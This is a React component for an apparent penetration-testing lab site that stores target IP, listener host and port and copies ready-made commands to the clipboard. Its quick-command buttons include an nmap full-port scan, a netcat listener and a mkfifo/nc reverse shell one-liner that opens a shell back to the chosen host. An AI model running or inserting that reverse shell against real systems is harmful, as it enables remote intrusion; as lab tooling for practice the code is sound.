"use client";

import React, { useState, useEffect } from "react";
import { Terminal, Crosshair, Copy, Check, ChevronDown, ChevronUp, Sparkles, RefreshCw } from "lucide-react";

interface TargetVariablesBarProps {
  onVariablesChange?: (vars: { targetIp: string; lhost: string; lport: string }) => void;
}

export function TargetVariablesBar({ onVariablesChange }: TargetVariablesBarProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [targetIp, setTargetIp] = useState("10.129.201.55");
  const [lhost, setLhost] = useState("10.10.14.88");
  const [lport, setLport] = useState("4444");
  const [copiedVar, setCopiedVar] = useState<string | null>(null);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedTarget = sessionStorage.getItem("cyber_var_target");
      if (savedTarget) setTargetIp(savedTarget);
      const savedLhost = sessionStorage.getItem("cyber_var_lhost");
      if (savedLhost) setLhost(savedLhost);
      const savedLport = sessionStorage.getItem("cyber_var_lport");
      if (savedLport) setLport(savedLport);
    }
  }, []);

  const handleUpdate = (field: "target" | "lhost" | "lport", val: string) => {
    if (field === "target") {
      setTargetIp(val);
      sessionStorage.setItem("cyber_var_target", val);
    } else if (field === "lhost") {
      setLhost(val);
      sessionStorage.setItem("cyber_var_lhost", val);
    } else if (field === "lport") {
      setLport(val);
      sessionStorage.setItem("cyber_var_lport", val);
    }
    if (onVariablesChange) {
      onVariablesChange({
        targetIp: field === "target" ? val : targetIp,
        lhost: field === "lhost" ? val : lhost,
        lport: field === "lport" ? val : lport,
      });
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedVar(label);
    setTimeout(() => setCopiedVar(null), 1800);
  };

  return (
    <div className="my-4 rounded-xl border border-[#1f3352] bg-[#111d30]/90 backdrop-blur-xl shadow-xl overflow-hidden transition-all">
      {/* Header / Toggle Bar */}
      <div
        onClick={() => setIsOpen(!isOpen)}
        className="px-4 py-2.5 bg-[#14233c] flex items-center justify-between cursor-pointer select-none hover:bg-[#182844] transition-colors"
      >
        <div className="flex items-center gap-2.5 text-xs font-mono">
          <Crosshair className="w-4 h-4 text-[#9fef00] animate-pulse" />
          <span className="font-bold text-[#ffffff]">ENGAGEMENT PARAMETERS</span>
          <span className="hidden sm:inline-block text-[10px] px-2 py-0.5 rounded bg-[#9fef00]/15 text-[#9fef00] border border-[#9fef00]/30">
            PAYLOAD INJECTOR
          </span>
        </div>

        <div className="flex items-center gap-3">
          <div className="hidden md:flex items-center gap-3 text-[11px] font-mono text-[#8ba0c3]">
            <span>TARGET: <strong className="text-[#9fef00]">{targetIp}</strong></span>
            <span>•</span>
            <span>LHOST: <strong className="text-[#2de2e6]">{lhost}</strong></span>
            <span>•</span>
            <span>LPORT: <strong className="text-[#ff8400]">{lport}</strong></span>
          </div>

          <button
            type="button"
            className="p-1 rounded text-[#6c7d9c] hover:text-[#ffffff]"
            title={isOpen ? "Collapse variables" : "Configure variables"}
          >
            {isOpen ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
        </div>
      </div>

      {/* Expanded Controls Panel */}
      {isOpen && (
        <div className="p-4 space-y-4 border-t border-[#1f3352] bg-[#070b13]">
          <p className="text-[11px] text-[#8ba0c3] leading-relaxed">
            Specify your live lab / VPN interface targets. One-click copy parameterized IP addresses or export commands with target variables auto-populated.
          </p>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            {/* Target IP */}
            <div className="space-y-1">
              <label className="text-[10px] font-mono text-[#6c7d9c] uppercase block">
                Target IP / Host
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={targetIp}
                  onChange={(e) => handleUpdate("target", e.target.value)}
                  placeholder="e.g. 10.129.20.14"
                  className="w-full px-3 py-1.5 pr-8 rounded-lg bg-[#111d30] border border-[#1f3352] text-xs font-mono text-[#9fef00] font-bold focus:border-[#9fef00] focus:outline-none"
                />
                <button
                  type="button"
                  onClick={() => copyToClipboard(targetIp, "target")}
                  className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-[#6c7d9c] hover:text-[#9fef00]"
                  title="Copy Target IP"
                >
                  {copiedVar === "target" ? (
                    <Check className="w-3.5 h-3.5 text-[#9fef00]" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>

            {/* LHOST (tun0) */}
            <div className="space-y-1">
              <label className="text-[10px] font-mono text-[#6c7d9c] uppercase block">
                LHOST (VPN tun0)
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={lhost}
                  onChange={(e) => handleUpdate("lhost", e.target.value)}
                  placeholder="e.g. 10.10.14.x"
                  className="w-full px-3 py-1.5 pr-8 rounded-lg bg-[#111d30] border border-[#1f3352] text-xs font-mono text-[#2de2e6] font-bold focus:border-[#2de2e6] focus:outline-none"
                />
                <button
                  type="button"
                  onClick={() => copyToClipboard(lhost, "lhost")}
                  className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-[#6c7d9c] hover:text-[#2de2e6]"
                  title="Copy LHOST"
                >
                  {copiedVar === "lhost" ? (
                    <Check className="w-3.5 h-3.5 text-[#2de2e6]" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>

            {/* LPORT */}
            <div className="space-y-1">
              <label className="text-[10px] font-mono text-[#6c7d9c] uppercase block">
                LPORT (Listener)
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={lport}
                  onChange={(e) => handleUpdate("lport", e.target.value)}
                  placeholder="4444"
                  className="w-full px-3 py-1.5 pr-8 rounded-lg bg-[#111d30] border border-[#1f3352] text-xs font-mono text-[#ff8400] font-bold focus:border-[#ff8400] focus:outline-none"
                />
                <button
                  type="button"
                  onClick={() => copyToClipboard(lport, "lport")}
                  className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-[#6c7d9c] hover:text-[#ff8400]"
                  title="Copy LPORT"
                >
                  {copiedVar === "lport" ? (
                    <Check className="w-3.5 h-3.5 text-[#ff8400]" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Quick One-Liner Generator Snippets */}
          <div className="pt-2 border-t border-[#1f3352] flex flex-wrap items-center gap-2 text-xs font-mono">
            <span className="text-[#6c7d9c] text-[10px]">Quick Commands:</span>
            <button
              type="button"
              onClick={() =>
                copyToClipboard(
                  `nmap -sC -sV -p- --min-rate 1000 ${targetIp} -oN nmap_initial.txt`,
                  "nmap"
                )
              }
              className="px-2.5 py-1 rounded bg-[#14233c] border border-[#1f3352] hover:border-[#9fef00] text-[#ffffff] text-[11px] transition-colors flex items-center gap-1.5"
            >
              <Terminal className="w-3 h-3 text-[#9fef00]" />
              <span>Full Nmap Scan</span>
              {copiedVar === "nmap" && <Check className="w-3 h-3 text-[#9fef00]" />}
            </button>

            <button
              type="button"
              onClick={() => copyToClipboard(`nc -lvnp ${lport}`, "nc")}
              className="px-2.5 py-1 rounded bg-[#14233c] border border-[#1f3352] hover:border-[#2de2e6] text-[#ffffff] text-[11px] transition-colors flex items-center gap-1.5"
            >
              <Terminal className="w-3 h-3 text-[#2de2e6]" />
              <span>Netcat Listener</span>
              {copiedVar === "nc" && <Check className="w-3 h-3 text-[#2de2e6]" />}
            </button>

            <button
              type="button"
              onClick={() =>
                copyToClipboard(
                  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
                  "revshell"
                )
              }
              className="px-2.5 py-1 rounded bg-[#14233c] border border-[#1f3352] hover:border-[#ff8400] text-[#ffffff] text-[11px] transition-colors flex items-center gap-1.5"
            >
              <Terminal className="w-3 h-3 text-[#ff8400]" />
              <span>Bash Reverse Shell</span>
              {copiedVar === "revshell" && <Check className="w-3 h-3 text-[#ff8400]" />}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
